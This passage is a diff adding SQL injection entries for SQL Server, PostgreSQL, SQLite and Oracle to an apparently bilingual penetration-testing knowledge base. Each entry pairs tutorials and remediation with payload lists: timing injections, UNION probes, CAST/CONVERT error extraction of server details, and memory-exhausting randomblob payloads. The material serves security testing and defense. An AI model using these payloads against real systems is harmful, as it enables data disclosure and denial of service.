+            "en": "Collect repeated normal requests for median and jitter, then send one short WAITFOR; if unstable, use a fixed CONVERT error or NULL-column probe. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "' WAITFOR DELAY '0:0:3'--\n' WAITFOR DELAY '0:0:5'--\n\" WAITFOR DELAY '0:0:3'--\n') WAITFOR DELAY '0:0:3'--\n\") WAITFOR DELAY '0:0:3'--\n1' WAITFOR DELAY '0:0:3'--\n1\" WAITFOR DELAY '0:0:3'--\n1) WAITFOR DELAY '0:0:3'--\n1') WAITFOR DELAY '0:0:3'--\n1\") WAITFOR DELAY '0:0:3'--\n' OR WAITFOR DELAY '0:0:3'--\n\" OR WAITFOR DELAY '0:0:3'--\n') OR WAITFOR DELAY '0:0:3'--\n\") OR WAITFOR DELAY '0:0:3'--\n1' OR WAITFOR DELAY '0:0:3'--\n1\" OR WAITFOR DELAY '0:0:3'--\n1) OR WAITFOR DELAY '0:0:3'--\n1') OR WAITFOR DELAY '0:0:3'--\n1\") OR WAITFOR DELAY '0:0:3'--\n';WAITFOR DELAY '0:0:3'--\n\";WAITFOR DELAY '0:0:3'--\n');WAITFOR DELAY '0:0:3'--\n\");WAITFOR DELAY '0:0:3'--\n1';WAITFOR DELAY '0:0:3'--\n1\";WAITFOR DELAY '0:0:3'--\n1);WAITFOR DELAY '0:0:3'--\n1');WAITFOR DELAY '0:0:3'--\n1\");WAITFOR DELAY '0:0:3'--\n' AND 1=CONVERT(int,(SELECT db_name()))--\n' AND 1=CONVERT(int,(SELECT system_user))--\n' AND 1=CONVERT(int,(SELECT @@servername))--\n' AND 1=CONVERT(int,(SELECT @@servicename))--\n' UNION ALL SELECT NULL--\n' UNION ALL SELECT NULL,NULL--\n' UNION ALL SELECT NULL,NULL,NULL--\n' UNION ALL SELECT NULL,NULL,NULL,NULL--\n' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--\n1 UNION SELECT NULL\n1 UNION SELECT NULL,NULL\n1 UNION SELECT NULL,NULL,NULL\n1 UNION SELECT NULL,NULL,NULL,NULL\n1 UNION SELECT NULL,NULL,NULL,NULL,NULL\n1 UNION ALL SELECT NULL\n1 UNION ALL SELECT NULL,NULL\n1 UNION ALL SELECT NULL,NULL,NULL\n1 UNION ALL SELECT NULL,NULL,NULL,NULL\n1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL\n1' UNION SELECT NULL--\n1' UNION SELECT NULL,NULL--\n1' UNION SELECT NULL,NULL,NULL--"
+        },
+        {
+          "title": {
+            "zh": "核对Microsoft SQL Server 注入成功证据",
+            "en": "Verify Microsoft SQL Server Injection evidence"
+          },
+          "description": {
+            "zh": "时间信号需重复统计并关联 SQL Server 会话，错误或 UNION 信号需对应最终 T-SQL；一次慢响应不能证明盲注。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Timing requires repeated statistics and SQL Server session correlation, while error or UNION evidence must match final T-SQL; one slow response proves nothing. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归Microsoft SQL Server 注入",
+            "en": "Remediate and regress Microsoft SQL Server Injection"
+          },
+          "description": {
+            "zh": "使用参数化 T-SQL 和类型化存储过程参数，关闭不需要的多语句能力，执行最小权限并监控 WAITFOR 与异常 UNION。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use parameterized T-SQL and typed stored-procedure parameters, disable unnecessary multi-statements, apply least privilege, and monitor WAITFOR and anomalous UNION use. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql",
+        "https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这些是 SQL Server 查询上下文的验证载荷，工具调用应保留在 SQLMap 或 MSSQL 工具卡。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-postgresql",
+      "prerequisites": [
+        {
+          "zh": "确认 PostgreSQL 版本、驱动多语句策略和参数所在的语句或表达式位置，避免误用其他方言。",
+          "en": "Confirm the PostgreSQL version, the driver's multi-statement policy, and whether the parameter occupies a statement or expression position to avoid cross-dialect assumptions."
+        },
+        {
+          "zh": "为测试连接设置 application_name 或等价会话标签，并采集 pg_stat_activity、错误日志和交错延迟基线。",
+          "en": "Tag test connections with application_name or an equivalent session label, and collect pg_stat_activity, error logs, and interleaved latency baselines."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性是恒真条件下的 pg_sleep 样本与恒假条件形成稳定分布差异且可关联到数据库会话，或受控字符串通过 CAST 错误通道返回。驱动拒绝分号、普通网络抖动、statement_timeout、函数返回类型错误或单次慢查询都是假阳性边界。",
+        "en": "A positive result is a stable timing-distribution difference between true-branch pg_sleep samples and false controls correlated to database sessions, or a controlled string returned through a CAST error channel. Driver rejection of semicolons, ordinary network jitter, statement_timeout, function return-type errors, or one slow query are false-positive boundaries."
+      },
+      "opsecTips": [
+        {
+          "zh": "交错样本达到预定统计阈值后停止，不增加 sleep 时长或并发数来强化现象。",
+          "en": "Stop after interleaved samples reach the predetermined statistical threshold; do not increase sleep duration or concurrency to amplify the effect."
+        },
+        {
+          "zh": "取消带测试标签的活动会话，恢复 statement_timeout，删除临时标记数据并移除诊断日志。",
+          "en": "Cancel active tagged sessions, restore statement_timeout, delete temporary marker data, and remove diagnostic logs."
+        }
+      ],
+      "name": {
+        "zh": "PostgreSQL 时间与报错注入",
+        "en": "PostgreSQL Time and Error Injection"
+      },
+      "description": {
+        "zh": "使用 pg_sleep、类型转换和会话函数构造时间或报错证据，验证输入是否进入 PostgreSQL 表达式。",
+        "en": "Uses pg_sleep, casts, and session functions to build timing or error evidence that input reached a PostgreSQL expression."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "PostgreSQL 注入",
+        "en": "PostgreSQL Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "PostgreSQL 时间与报错注入聚焦该集合覆盖 pg_sleep 的语句与表达式位置及 CAST 报错；驱动对分号、多语句和函数返回类型的处理必须先核对。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "PostgreSQL Time and Error Injection focuses on this boundary: The set covers statement and expression placements for pg_sleep plus CAST errors; verify how the driver handles semicolons, multi-statements, and function return types. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "拼接式 PostgreSQL 查询允许输入改变谓词、追加语句或调用函数，错误回显和宽权限会泄露会话与数据库信息。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Concatenated PostgreSQL queries let input alter predicates, append statements, or call functions, while verbose errors and broad privileges expose session and database information. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "建立无延时统计基线后，用最短可识别的 pg_sleep 真假分支，或使用固定字符串的 CAST 错误作为独立证据。 将响应耗时与 pg_stat_activity、慢查询或应用日志关联；网络抖动、锁等待和应用超时必须被排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "After a no-delay timing baseline, use the shortest distinguishable true and false pg_sleep branches or a fixed-string CAST error as an independent channel. Correlate response timing with pg_stat_activity, slow-query, or application logs and exclude network jitter, lock waits, and application timeouts. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用 PostgreSQL 驱动绑定参数，限制连接角色权限，统一错误映射，设置语句超时并检测异常 pg_sleep 与转换失败。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use PostgreSQL driver bind parameters, reduce connection-role privileges, normalize errors, set statement timeouts, and detect anomalous pg_sleep calls and cast failures. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认PostgreSQL 注入前置条件",
+            "en": "Confirm PostgreSQL Injection prerequisites"
+          },
+          "description": {
+            "zh": "该集合覆盖 pg_sleep 的语句与表达式位置及 CAST 报错；驱动对分号、多语句和函数返回类型的处理必须先核对。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "The set covers statement and expression placements for pg_sleep plus CAST errors; verify how the driver handles semicolons, multi-statements, and function return types. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控PostgreSQL 注入探针",
+            "en": "Run a controlled PostgreSQL Injection probe"
+          },
+          "description": {
+            "zh": "建立无延时统计基线后，用最短可识别的 pg_sleep 真假分支，或使用固定字符串的 CAST 错误作为独立证据。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "After a no-delay timing baseline, use the shortest distinguishable true and false pg_sleep branches or a fixed-string CAST error as an independent channel. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "'; SELECT pg_sleep(3)--\n'; SELECT pg_sleep(5)--\n\" ; SELECT pg_sleep(3)--\n') ; SELECT pg_sleep(3)--\n\") ; SELECT pg_sleep(3)--\n1' ; SELECT pg_sleep(3)--\n1\" ; SELECT pg_sleep(3)--\n1) ; SELECT pg_sleep(3)--\n1') ; SELECT pg_sleep(3)--\n1\") ; SELECT pg_sleep(3)--\n' OR pg_sleep(3)--\n\" OR pg_sleep(3)--\n') OR pg_sleep(3)--\n\") OR pg_sleep(3)--\n1' OR pg_sleep(3)--\n1\" OR pg_sleep(3)--\n1) OR pg_sleep(3)--\n1') OR pg_sleep(3)--\n1\") OR pg_sleep(3)--\n'; SELECT * FROM pg_sleep(3)--\n\" ; SELECT * FROM pg_sleep(3)--\n') ; SELECT * FROM pg_sleep(3)--\n\") ; SELECT * FROM pg_sleep(3)--\n1' ; SELECT * FROM pg_sleep(3)--\n1\" ; SELECT * FROM pg_sleep(3)--\n1) ; SELECT * FROM pg_sleep(3)--\n1') ; SELECT * FROM pg_sleep(3)--\n1\") ; SELECT * FROM pg_sleep(3)--\n' OR 1=1; SELECT * FROM pg_sleep(3)--\n\" OR 1=1; SELECT * FROM pg_sleep(3)--\n') OR 1=1; SELECT * FROM pg_sleep(3)--\n\") OR 1=1; SELECT * FROM pg_sleep(3)--\n1' OR 1=1; SELECT * FROM pg_sleep(3)--\n1\" OR 1=1; SELECT * FROM pg_sleep(3)--\n1) OR 1=1; SELECT * FROM pg_sleep(3)--\n1') OR 1=1; SELECT * FROM pg_sleep(3)--\n1\") OR 1=1; SELECT * FROM pg_sleep(3)--\n' AND 1=CAST((SELECT version()) AS int)--\n' AND 1=CAST((SELECT current_database()) AS int)--\n' AND 1=CAST((SELECT current_user) AS int)--\n' AND 1=CAST((SELECT session_user) AS int)--\n' AND 1=CAST((SELECT inet_server_addr()) AS int)--\n' AND 1=CAST((SELECT inet_server_port()) AS int)--"
+        },
+        {
+          "title": {
+            "zh": "核对PostgreSQL 注入成功证据",
+            "en": "Verify PostgreSQL Injection evidence"
+          },
+          "description": {
+            "zh": "将响应耗时与 pg_stat_activity、慢查询或应用日志关联；网络抖动、锁等待和应用超时必须被排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Correlate response timing with pg_stat_activity, slow-query, or application logs and exclude network jitter, lock waits, and application timeouts. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归PostgreSQL 注入",
+            "en": "Remediate and regress PostgreSQL Injection"
+          },
+          "description": {
+            "zh": "使用 PostgreSQL 驱动绑定参数，限制连接角色权限，统一错误映射，设置语句超时并检测异常 pg_sleep 与转换失败。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use PostgreSQL driver bind parameters, reduce connection-role privileges, normalize errors, set statement timeouts, and detect anomalous pg_sleep calls and cast failures. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://www.postgresql.org/docs/current/functions-datetime.html",
+        "https://www.postgresql.org/docs/current/sql-prepare.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是 PostgreSQL 方言的时间与报错验证载荷，不是 psql 工具用法。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-sqlite",
+      "prerequisites": [
+        {
+          "zh": "只在数据库副本和受资源限制的独立进程中验证，并从远低于语料中最大 randomblob 大小的样本开始。",
+          "en": "Validate only against a database copy in a resource-limited process, starting with samples far below the corpus's maximum randomblob size."
+        },
+        {
+          "zh": "持续记录 CPU、内存、查询时长以及 SQLite 版本，并用恒假分支和不同低档尺寸建立缩放曲线。",
+          "en": "Continuously record CPU, memory, query duration, and SQLite version, and build a scaling curve with false branches and several low-size values."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性要求受控表达式在恒真分支中随 randomblob 尺寸呈可重复的资源或时延增长，或 sqlite_version 固定标记经可观察列返回，并能在进程内查询记录中对应。主机本身高负载、一次 OOM、数据库锁、页面超时或服务崩溃不构成可靠注入证明。",
+        "en": "Positive evidence requires reproducible resource or timing growth with controlled randomblob size on the true branch, or a fixed sqlite_version marker returned through an observable column and correlated with in-process query records. Existing host load, one out-of-memory event, a database lock, page timeout, or service crash is not reliable injection proof."
+      },
+      "opsecTips": [
+        {
+          "zh": "低尺寸样本已经形成单调差异后立即停止，禁止执行 500000000 字节级别的最大值或并行放大测试。",
+          "en": "Stop as soon as low-size samples establish a monotonic differential; do not execute 500000000-byte maxima or parallel amplification tests."
+        },
+        {
+          "zh": "终止测试工作进程，删除数据库副本及其 WAL/SHM 临时文件，释放资源配额并恢复原超时设置。",
+          "en": "Terminate the test worker, delete the database copy and its WAL/SHM temporary files, release resource limits, and restore the original timeout settings."
+        }
+      ],
+      "name": {
+        "zh": "SQLite 资源消耗与版本探测",
+        "en": "SQLite Resource-Consumption and Version Probes"
+      },
+      "description": {
+        "zh": "利用 randomblob、HEX、LIKE 和 sqlite_version 建立受控资源或函数执行差异，识别嵌入式查询注入。",
+        "en": "Uses randomblob, HEX, LIKE, and sqlite_version to create controlled resource or function-execution differences for detecting embedded-query injection."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "SQLite 注入",
+        "en": "SQLite Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "SQLite 资源消耗与版本探测聚焦SQLite 没有通用 sleep，集合用大 randomblob 放大计算时间；应先缩小参数并观察随规模变化的趋势，禁止重复最大值。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "SQLite Resource-Consumption and Version Probes focuses on this boundary: SQLite has no general sleep, so the set amplifies work with large randomblob values; start with reduced sizes and observe scaling rather than repeating maximum values. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入被拼进 SQLite 表达式后可调用内置函数或访问系统表；数据库常与应用进程共享 CPU 和内存，因此昂贵表达式也影响可用性。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Concatenated SQLite input can call built-in functions or inspect catalogs; because SQLite often shares application CPU and memory, expensive expressions also affect availability. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "确认 SQLite 后测量固定数据集基线，再从低规模 randomblob 逐级增加并对比恒假分支，同时观察进程 CPU、内存和超时。 只有耗时和资源随参数规模稳定增长且日志显示函数执行才确认；单次卡顿、进程 GC 或共享主机负载都不是充分证据。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "After confirming SQLite, measure a fixed-data baseline, then increase a low randomblob size gradually against a false branch while observing process CPU, memory, and timeouts. Confirm only when timing and resources scale consistently with size and logs show function execution; one stall, garbage collection, or shared-host load is insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用 SQLite 绑定参数，设置执行预算、进度处理器和并发限制，限制数据库文件权限并监控异常大 BLOB 与长查询。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use SQLite bind parameters, execution budgets, progress handlers, and concurrency limits, restrict database-file permissions, and monitor large BLOB operations and long queries. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认SQLite 注入前置条件",
+            "en": "Confirm SQLite Injection prerequisites"
+          },
+          "description": {
+            "zh": "SQLite 没有通用 sleep，集合用大 randomblob 放大计算时间；应先缩小参数并观察随规模变化的趋势，禁止重复最大值。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "SQLite has no general sleep, so the set amplifies work with large randomblob values; start with reduced sizes and observe scaling rather than repeating maximum values. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控SQLite 注入探针",
+            "en": "Run a controlled SQLite Injection probe"
+          },
+          "description": {
+            "zh": "确认 SQLite 后测量固定数据集基线，再从低规模 randomblob 逐级增加并对比恒假分支，同时观察进程 CPU、内存和超时。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "After confirming SQLite, measure a fixed-data baseline, then increase a low randomblob size gradually against a false branch while observing process CPU, memory, and timeouts. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
+          "payload": "' AND 1=randomblob(500000000)--\n\" AND 1=randomblob(500000000)--\n') AND 1=randomblob(500000000)--\n\") AND 1=randomblob(500000000)--\n1' AND 1=randomblob(500000000)--\n1\" AND 1=randomblob(500000000)--\n1) AND 1=randomblob(500000000)--\n1') AND 1=randomblob(500000000)--\n1\") AND 1=randomblob(500000000)--\n' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n1\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n1) AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n1') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n1\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\n' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n1\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n1) AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n1') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n1\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--\n' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n1\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n1) AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n1') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n1\") AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--\n' AND sqlite_version()--\n' AND sqlite_version()=sqlite_version()--"
+        },
+        {
+          "title": {
+            "zh": "核对SQLite 注入成功证据",
+            "en": "Verify SQLite Injection evidence"
+          },
+          "description": {
+            "zh": "只有耗时和资源随参数规模稳定增长且日志显示函数执行才确认；单次卡顿、进程 GC 或共享主机负载都不是充分证据。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。",
+            "en": "Confirm only when timing and resources scale consistently with size and logs show function execution; one stall, garbage collection, or shared-host load is insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter."
+          }
+        },
+        {
+          "title": {
+            "zh": "修复并回归SQLite 注入",
+            "en": "Remediate and regress SQLite Injection"
+          },
+          "description": {
+            "zh": "使用 SQLite 绑定参数，设置执行预算、进度处理器和并发限制，限制数据库文件权限并监控异常大 BLOB 与长查询。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。",
+            "en": "Use SQLite bind parameters, execution budgets, progress handlers, and concurrency limits, restrict database-file permissions, and monitor large BLOB operations and long queries. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization."
+          }
+        }
+      ],
+      "references": [
+        "https://www.sqlite.org/lang_corefunc.html",
+        "https://www.sqlite.org/c3ref/bind_blob.html",
+        "https://www.sqlite.org/c3ref/progress_handler.html"
+      ],
+      "review": {
+        "decision": "payload",
+        "rationale": "这是 SQLite 表达式探针；教程已明确资源边界，仍属于 Payload。",
+        "issuesResolved": [
+          "corrected-name",
+          "corrected-description",
+          "reviewed-command-dialects",
+          "added-tutorial",
+          "rewrote-attack-chain",
+          "added-authoritative-references",
+          "defined-success-and-false-positive-evidence"
+        ]
+      }
+    },
+    {
+      "id": "sqli2-oracle",
+      "prerequisites": [
+        {
+          "zh": "确认 Oracle 版本以及 DUAL、ROWNUM 和相关包函数在测试账户下的可用性，并剔除 MySQL 方言残留。",
+          "en": "Confirm the Oracle version and availability of DUAL, ROWNUM, and relevant package functions for the test account, excluding MySQL-dialect residue."
+        },
+        {
+          "zh": "使用受限 schema、合成标记表和数据库审计，准备结构一致的恒真/恒假谓词与无权限包调用对照。",
+          "en": "Use a restricted schema, a synthetic marker table, and database auditing, with structurally matched true/false predicates and an unauthorized package-call control."
+        }
+      ],
+      "analysis": {
+        "zh": "阳性证据是 Oracle 语义下的真/假谓词稳定改变标记行结果，或兼容包函数把受控值带入异常且审计显示表达式执行。ORA 语法错误、包不存在或无执行权限、DUAL 的正常常量结果、以及跨方言函数失败均是假阳性。",
+        "en": "Positive evidence is an Oracle-semantic true/false predicate reproducibly changing marker-row results, or a compatible package function carrying a controlled value into an exception with auditing showing expression execution. ORA syntax errors, unavailable or unauthorized packages, normal constants selected from DUAL, and failures of cross-dialect functions are false positives."
+      },
+      "opsecTips": [
+        {
+          "zh": "一个 DUAL 标记、布尔差异或受控异常被确认后停止，不调用真实网络解析目标或读取 v$ 目录内容。",
+          "en": "Stop after confirming one DUAL marker, Boolean differential, or controlled exception; do not resolve real network targets or read v$ catalog content."
+        },
+        {
+          "zh": "取消残留会话，删除合成对象，撤销临时包权限并清除测试审计记录，再恢复账户资源限制。",
+          "en": "Cancel residual sessions, drop synthetic objects, revoke temporary package grants, clear test audit records, and restore account resource limits."
+        }
+      ],
+      "name": {
+        "zh": "Oracle 布尔、报错与 UNION 注入",
+        "en": "Oracle Boolean, Error, and UNION Injection"
+      },
+      "description": {
+        "zh": "覆盖 Oracle 的布尔条件、DUAL/UNION、类型转换与包函数报错，并标明需要排除的跨方言残留。",
+        "en": "Covers Oracle Boolean predicates, DUAL/UNION, conversion and package-function errors while flagging cross-dialect residues that must be excluded."
+      },
+      "category": {
+        "zh": "SQL/NoSQL注入",
+        "en": "SQL/NoSQL Injection"
+      },
+      "subCategory": {
+        "zh": "Oracle Database 注入",
+        "en": "Oracle Database Injection"
+      },
+      "tutorial": {
+        "overview": {
+          "zh": "Oracle 布尔、报错与 UNION 注入聚焦Oracle 验证应围绕 DUAL、ROWNUM 和可用包；原集合夹有 MySQL 风格十六进制及 XML 函数写法，必须按版本筛除。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。",
+          "en": "Oracle Boolean, Error, and UNION Injection focuses on this boundary: Oracle validation should center on DUAL, ROWNUM, and available packages; filter MySQL-style hexadecimal and XML-function residues by version. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control."
+        },
+        "vulnerability": {
+          "zh": "输入拼入 Oracle SQL 后可以修改谓词、追加 UNION 或触发转换与包函数异常，过宽字典视图和网络包权限会扩大泄露。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。",
+          "en": "Input concatenated into Oracle SQL can alter predicates, append UNION, or trigger conversion and package errors, while broad dictionary and network-package privileges expand disclosure. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone."
+        },
+        "exploitation": {
+          "zh": "先用 DUAL 与合法函数确认版本，再以真假谓词、NULL FROM DUAL 或版本支持的固定转换错误选择单一证据通道。 最终 SQL 和数据库审计必须显示预期 Oracle 表达式；跨方言语法错误、包未授权或统一 ORA 页面都不能单独确认。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。",
+          "en": "Confirm the version with DUAL and benign functions, then choose one channel: paired predicates, NULL FROM DUAL, or a version-supported fixed conversion error. Final SQL and database auditing must show the intended Oracle expression; cross-dialect errors, denied packages, or a generic ORA page do not confirm injection. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain."
+        },
+        "mitigation": {
+          "zh": "使用 Oracle 绑定变量，允许列表映射动态标识符，撤销不必要字典视图、UTL_* 包和网络 ACL，并统一 ORA 错误。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。",
+          "en": "Use Oracle bind variables, allowlist dynamic identifiers, revoke unnecessary dictionary, UTL_* package, and network ACL access, and normalize ORA errors. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone."
+        },
+        "difficulty": "advanced"
+      },
+      "attackChain": [
+        {
+          "title": {
+            "zh": "确认Oracle Database 注入前置条件",
+            "en": "Confirm Oracle Database Injection prerequisites"
+          },
+          "description": {
+            "zh": "Oracle 验证应围绕 DUAL、ROWNUM 和可用包；原集合夹有 MySQL 风格十六进制及 XML 函数写法，必须按版本筛除。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。",
+            "en": "Oracle validation should center on DUAL, ROWNUM, and available packages; filter MySQL-style hexadecimal and XML-function residues by version. Record the database product, version, driver, field type, normal response, and server-log baseline."
+          }
+        },
+        {
+          "title": {
+            "zh": "执行受控Oracle Database 注入探针",
+            "en": "Run a controlled Oracle Database Injection probe"
+          },
+          "description": {
+            "zh": "先用 DUAL 与合法函数确认版本，再以真假谓词、NULL FROM DUAL 或版本支持的固定转换错误选择单一证据通道。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。",
+            "en": "Confirm the version with DUAL and benign functions, then choose one channel: paired predicates, NULL FROM DUAL, or a version-supported fixed conversion error. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request."
+          },
